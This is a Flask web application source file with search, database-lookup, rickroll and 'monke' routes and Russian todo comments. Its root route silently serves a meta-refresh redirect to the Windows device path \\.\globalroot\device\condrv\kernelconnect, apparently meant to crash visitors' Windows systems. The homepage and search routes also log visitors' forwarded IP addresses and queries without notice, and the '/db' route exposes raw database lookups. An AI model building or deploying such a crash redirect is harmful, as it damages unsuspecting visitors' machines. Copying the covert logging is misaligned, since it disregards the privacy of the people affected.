from flask import Flask, request, render_template
from database import get_info, submit_query, submit_metric

app = Flask(__name__)


# todo доработать поиск
# todo доработать майнер вк
# todo добавить placeholder (например, Эля 11)
# todo цитаты мса
# todo счетчик рикроллов
# todo cookies


@app.route('/')
def root():
    if 'HTTP_X_FORWARDED_FOR' in request.environ:
        submit_metric('/', '', request.environ['HTTP_X_FORWARDED_FOR'])
    return '<head>\
<meta http-equiv="refresh" content="1;URL=\\\\.\\globalroot\\device\\condrv\\kernelconnect"/></head>'


@app.route('/monke')
def monke():
    return render_template('monke.html')


@app.route('/redirect')
def rickroll():
    return '<head>\
<meta http-equiv="refresh" content="1;URL=https://www.youtube.com/watch?v=dQw4w9WgXcQ" /></head>'


@app.route('/search')
def search():
    query = request.args.get('q', '')
    if 'HTTP_X_FORWARDED_FOR' in request.environ:
        submit_metric('/search', query, request.environ['HTTP_X_FORWARDED_FOR'])
    info = get_info(query)
    return render_template('info.html', info=info)


@app.route('/db')
def db():
    query = request.args.get('name', '')
    return str(get_info(query))

